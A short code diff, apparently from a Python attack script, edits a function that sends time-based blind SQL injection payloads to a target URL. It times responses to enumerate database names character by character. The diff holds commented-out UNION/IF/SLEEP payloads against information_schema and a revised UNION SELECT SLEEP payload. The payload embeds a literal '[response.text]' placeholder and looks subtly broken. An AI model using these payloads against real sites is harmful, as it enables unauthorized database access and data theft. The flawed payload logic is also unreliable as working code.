@@ -11,7 +11,7 @@ def get_db_names(url):
         for j in range(0, len(dictionary)):
             """query = "' UNION SELECT 1,2,3,4,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 0,1 OFFSET {} --".format(i)
             payload = "' AND IF(MID((select count(*) from (%s) as totalCount),%s,1)='%s',SLEEP(%s),0)--+" % (query, str(j), quote(dictionary[j]), str(TIME))"""
-            payload = "SELECT * FROM users WHERE username = 'test' AND password = 'test' UNION SELECT SLEEP(TIME),2 where database() like '[response.text]%';--'"
+            payload = "SELECT * FROM users WHERE username = 'test' AND password = 'test' UNION SELECT SLEEP(TIME),1,2 where database() like '[response.text]%';--'"
             start_time = time.time()
             response = requests.post(url+payload)
             end_time = time.time()
